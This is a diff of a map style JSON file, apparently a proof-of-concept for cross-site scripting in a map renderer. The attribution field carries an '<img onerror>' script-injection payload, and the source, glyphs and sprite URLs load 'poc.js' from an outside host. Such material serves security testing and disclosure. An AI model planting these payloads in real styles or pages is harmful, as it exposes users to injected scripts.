@@ -5,7 +5,7 @@
         "esri": {
             "type": "vector",
             "attribution": "<img src=x onerror=alert(document.domain)>",
-            "url": "https://ihatedota.com/poc.js?d"
+            "url": "https://ihatedota.com/poc.js?dsr"
         }
     },
     "layers": [
@@ -18,6 +18,6 @@
             }
         }
     ],
-    "glyphs": "https://ihatedota.com/poc.js?d",
-    "sprite": "https://ihatedota.com/poc.js?d"
+    "glyphs": "https://ihatedota.com/poc.js?glyphs",
+    "sprite": "https://ihatedota.com/poc.js?sprite"
 }
